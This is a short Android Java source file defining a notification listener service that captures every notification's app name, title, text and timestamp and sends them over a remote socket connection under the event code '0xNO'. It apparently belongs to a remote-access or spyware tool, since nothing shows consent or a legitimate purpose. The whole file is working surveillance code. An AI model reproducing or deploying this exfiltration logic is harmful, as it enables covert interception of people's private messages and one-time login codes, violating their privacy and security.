package br.com.assessoriarealeza.irp;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Notification;
import android.os.Bundle;
import android.os.IBinder;

import android.content.Intent;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationListener extends NotificationListenerService {

    @Override
    public IBinder onBind(Intent intent) {
        // Se este serviço for vinculado, retorne o IBinder padrão
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        // Quando uma nova notificação é postada, capturamos os dados relevantes e os enviamos via socket

        String packageName = sbn.getPackageName();
        String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
        String content = extractContent(sbn);
        long postTime = sbn.getPostTime();
        String uniqueKey = sbn.getKey();

        JSONObject data = new JSONObject();
        try {
            data.put("appName", packageName);
            data.put("title", title);
            data.put("content", content);
            data.put("postTime", postTime);
            data.put("key", uniqueKey);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        IOSocket.getInstance().getIoSocket().emit("0xNO" , data);
    }

    private String extractContent(StatusBarNotification sbn) {
        // Extrai o conteúdo da notificação, verificando se a EXTRA_TEXT está presente (para notificações de texto)
        // ou se existe um ícone (para notificações sem texto)

        String content = "";
        Bundle extras = sbn.getNotification().extras;
        if (extras != null) {
            CharSequence contentCs = extras.getCharSequence(Notification.EXTRA_TEXT);
            if (contentCs != null) {
                content = contentCs.toString();
            } else {
                int smallIconResId = extras.getInt(Notification.EXTRA_SMALL_ICON);
                content = "Notification with icon only (smallIconResId=" + smallIconResId + ")";
            }
        }
        return content;
    }
}
